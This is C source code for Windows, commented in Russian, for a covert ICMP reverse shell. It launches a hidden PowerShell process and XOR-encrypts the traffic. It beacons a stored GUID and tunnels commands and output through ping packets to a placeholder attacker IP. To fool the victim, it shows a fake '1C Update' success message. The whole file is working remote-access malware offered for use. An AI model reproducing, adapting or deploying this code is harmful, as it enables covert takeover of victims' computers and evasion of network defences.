#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <rpc.h>

#define ICMP_HEADERS_SIZE	(sizeof(ICMP_ECHO_REPLY) + 8)

#define STATUS_OK					0
#define STATUS_PROCESS_NOT_CREATED	2

#define TRANSFER_SUCCESS			1
#define TRANSFER_FAILURE			0

// Значения по умолчанию для отправки ICMP запросов
#define DEFAULT_TIMEOUT			    5000 // Задержка отправки ICMP запроса при разрыве соединения (5 секунд)
#define DEFAULT_MAX_BLANKS	   	    10000 // Количество отправляемых ICMP запросов при разрыве соединения (10 тысяч раз)
#define DEFAULT_DELAY			    200 // Задержка между отправкой ICMP запросов при успешном соединении (0.2 секунды)
#define DEFAULT_MAX_DATA_SIZE	    128 // Максимальный размер отправляемых данных данных при успешном соединении

FARPROC icmp_create, icmp_send, to_ip;

// Функция для запуска командной оболочки
int spawn_shell(PROCESS_INFORMATION* pi, HANDLE* out_read, HANDLE* in_write)
{
	SECURITY_ATTRIBUTES sattr;
	STARTUPINFOA si;
	HANDLE in_read, out_write;

	memset(&si, 0x00, sizeof(SECURITY_ATTRIBUTES));
	memset(pi, 0x00, sizeof(PROCESS_INFORMATION));

	memset(&sattr, 0x00, sizeof(SECURITY_ATTRIBUTES));
	sattr.nLength = sizeof(SECURITY_ATTRIBUTES);
	sattr.bInheritHandle = TRUE;
	sattr.lpSecurityDescriptor = NULL;

	if (!CreatePipe(out_read, &out_write, &sattr, 0)) {
		return STATUS_PROCESS_NOT_CREATED;
	}
	if (!SetHandleInformation(*out_read, HANDLE_FLAG_INHERIT, 0)) {
		return STATUS_PROCESS_NOT_CREATED;
	}

	if (!CreatePipe(&in_read, in_write, &sattr, 0)) {
		return STATUS_PROCESS_NOT_CREATED;
	}
	if (!SetHandleInformation(*in_write, HANDLE_FLAG_INHERIT, 0)) {
		return STATUS_PROCESS_NOT_CREATED;
	}

	memset(&si, 0x00, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.hStdError = out_write;
	si.hStdOutput = out_write;
	si.hStdInput = in_read;
	si.dwFlags |= STARTF_USESTDHANDLES;

	// Флаг 0 заменяем на флаг CREATE_NO_WINDOW чтобы скрыть powershell окно
	if (!CreateProcessA(NULL, "powershell", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&si, pi)) {
		return STATUS_PROCESS_NOT_CREATED;
	}

	CloseHandle(out_write);
	CloseHandle(in_read);

	return STATUS_OK;
}

// XOR шифрование
void encrypt_xor(char* buffer, unsigned int size)
{
	const char* key = "jkzswqtrynup";
	unsigned int key_length = strlen(key);

	for (unsigned int i = 0; i < size; i++) {
		buffer[i] ^= key[i % key_length];
	}
}

// XOR дешифрование
void decrypt_xor(char* buffer, unsigned int size)
{
	encrypt_xor(buffer, size);
}

// Генерация случайного GUID
void generate_guid(char* guid_str)
{
	UUID uuid;
	UuidCreate(&uuid);
	RPC_CSTR str;
	UuidToStringA(&uuid, &str);
	strcpy_s(guid_str, 40, (char*)str);
	RpcStringFreeA(&str);
}

// Сохранение GUID в файл
void save_guid_to_file(const char* guid_str)
{
	char filepath[MAX_PATH];
	snprintf(filepath, MAX_PATH, "%s\\AppData\\Local\\Temp\\guid.txt", getenv("USERPROFILE"));

	// Проверяем существование файла
	if (_access(filepath, 0) == 0) {
		// Файл уже существует
		return;
	}

	FILE* file;
	if (fopen_s(&file, filepath, "w") == 0)
	{
		fprintf(file, "%s", guid_str);
		fclose(file);
	}
}

// Чтение GUID из файла
void read_guid_from_file(char* guid_str)
{
	char filepath[MAX_PATH];
	snprintf(filepath, MAX_PATH, "%s\\AppData\\Local\\Temp\\guid.txt", getenv("USERPROFILE"));

	FILE* file;
	if (fopen_s(&file, filepath, "r") == 0)
	{
		fscanf(file, "%s", guid_str);
		fclose(file);
	}
}

// Отправка ICMP пакета с GUID
int send_icmp_guid(HANDLE icmp_chan, unsigned int target, char* guid_str, unsigned int guid_size, unsigned int timeout)
{
    int rs;
    char* temp_in_buf;

    temp_in_buf = (char*)malloc(ICMP_HEADERS_SIZE);
    if (!temp_in_buf) {
        return TRANSFER_FAILURE;
    }

    rs = icmp_send(
        icmp_chan,
        target,
        guid_str,
        guid_size,
        NULL,
        temp_in_buf,
        ICMP_HEADERS_SIZE,
        timeout);

    free(temp_in_buf);

    return rs > 0 ? TRANSFER_SUCCESS : TRANSFER_FAILURE;
}

// Создание ICMP канала
void create_icmp_channel(HANDLE* icmp_chan)
{
	*icmp_chan = (HANDLE)icmp_create();
}

// Передача данных через ICMP
int transfer_icmp(HANDLE icmp_chan, unsigned int target, char* out_buf, unsigned int out_buf_size, char* in_buf, unsigned int* in_buf_size, unsigned int max_in_data_size, unsigned int timeout)
{
	int rs;
	char* temp_in_buf;
	int nbytes;

	temp_in_buf = (char*)malloc(max_in_data_size + ICMP_HEADERS_SIZE);
	if (!temp_in_buf) {
		return TRANSFER_FAILURE;
	}

	rs = icmp_send(
		icmp_chan,
		target,
		out_buf,
		out_buf_size,
		NULL,
		temp_in_buf,
		max_in_data_size + ICMP_HEADERS_SIZE,
		timeout);

	if (rs > 0) {
		PICMP_ECHO_REPLY echo_reply = (PICMP_ECHO_REPLY)temp_in_buf;
		if (echo_reply->DataSize > max_in_data_size) {
			nbytes = max_in_data_size;
		}
		else {
			nbytes = echo_reply->DataSize;
		}
		memcpy(in_buf, echo_reply->Data, nbytes);
		*in_buf_size = nbytes;

		free(temp_in_buf);
		return TRANSFER_SUCCESS;
	}

	free(temp_in_buf);

	return TRANSFER_FAILURE;
}

// Динамическая загрузка необходимых библиотек и функций
int load_deps()
{
	HMODULE lib;

	lib = LoadLibraryA("ws2_32.dll");
	if (lib != NULL) {
		to_ip = GetProcAddress(lib, "inet_addr");
		if (!to_ip) {
			return 0;
		}
	}

	lib = LoadLibraryA("iphlpapi.dll");
	if (lib != NULL) {
		icmp_create = GetProcAddress(lib, "IcmpCreateFile");
		icmp_send = GetProcAddress(lib, "IcmpSendEcho");
		if (icmp_create && icmp_send) {
			return 1;
		}
	}

	lib = LoadLibraryA("ICMP.DLL");
	if (lib != NULL) {
		icmp_create = GetProcAddress(lib, "IcmpCreateFile");
		icmp_send = GetProcAddress(lib, "IcmpSendEcho");
		if (icmp_create && icmp_send) {
			return 1;
		}
	}

	return 0;
}

// Используем WinMain вместо main для скрытия консоли
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char* target;
	unsigned int delay, timeout;
	unsigned int ip_addr;
	HANDLE pipe_read, pipe_write;
	HANDLE icmp_chan;
	unsigned char* in_buf, * out_buf;
	unsigned int in_buf_size, out_buf_size;
	DWORD rs;
	int blanks, max_blanks;
	PROCESS_INFORMATION pi;
	int status;
	unsigned int max_data_size;

	// Генерация GUID
	char guid_str[40];
	generate_guid(guid_str);
	save_guid_to_file(guid_str);
	read_guid_from_file(guid_str);

	// Шифрование GUID перед отправкой
	encrypt_xor(guid_str, strlen(guid_str));

	// Установка значений по умолчанию
	target = "<IP>"; // Указываем IP-адрес атакующей машины
	timeout = DEFAULT_TIMEOUT;
	delay = DEFAULT_DELAY;
	max_blanks = DEFAULT_MAX_BLANKS;
	max_data_size = DEFAULT_MAX_DATA_SIZE;

	status = STATUS_OK;
	if (!load_deps()) {
		return -1;
	}
	ip_addr = to_ip(target);

	status = spawn_shell(&pi, &pipe_read, &pipe_write);

	create_icmp_channel(&icmp_chan);
	if (icmp_chan == INVALID_HANDLE_VALUE) {
		return -1;
	}

	in_buf = (char*)malloc(max_data_size + ICMP_HEADERS_SIZE);
	out_buf = (char*)malloc(max_data_size + ICMP_HEADERS_SIZE);
	if (!in_buf || !out_buf) {
		return -1;
	}
	memset(in_buf, 0x00, max_data_size + ICMP_HEADERS_SIZE);
	memset(out_buf, 0x00, max_data_size + ICMP_HEADERS_SIZE);
	
	int connection = 0;

	MessageBoxA(NULL, "Обновление успешно установлено", "1C Update", MB_OK | MB_ICONASTERISK);

	blanks = 0;
	do {
		if (connection == 0)
		{
			// Отправка пакета с зашифрованным GUID
			if (send_icmp_guid(icmp_chan, ip_addr, guid_str, strlen(guid_str), timeout) != TRANSFER_SUCCESS) {
				blanks++;
				connection = 0;
				Sleep(delay);
				continue;
			}
			else
			{
				connection = 1;
			}
		}

		// Чтение данных для отправки
		switch (status) {
		case STATUS_PROCESS_NOT_CREATED:
			break;
		default:
			out_buf_size = 0;
			if (PeekNamedPipe(pipe_read, NULL, 0, NULL, &out_buf_size, NULL)) {
				if (out_buf_size > 0) {
					out_buf_size = 0;
					rs = ReadFile(pipe_read, out_buf, max_data_size, &out_buf_size, NULL);
				}
			}
			else {
				status = spawn_shell(&pi, &pipe_read, &pipe_write);
			}
			break;
		}

		encrypt_xor(out_buf, out_buf_size);

		if (transfer_icmp(icmp_chan, ip_addr, out_buf, out_buf_size, in_buf, &in_buf_size, max_data_size, timeout) == TRANSFER_SUCCESS) {
			if (status == STATUS_OK) {
				// Дешифрование полученных данных
				decrypt_xor(in_buf, in_buf_size);
				WriteFile(pipe_write, in_buf, in_buf_size, &rs, 0);
			}
			blanks = 0;
		}
		else {
			blanks++;
			connection = 0;
		}

		Sleep(delay);

	} while (status == STATUS_OK && blanks < max_blanks);

	if (status == STATUS_OK) {
		TerminateProcess(pi.hProcess, 0);
	}

	return 0;
}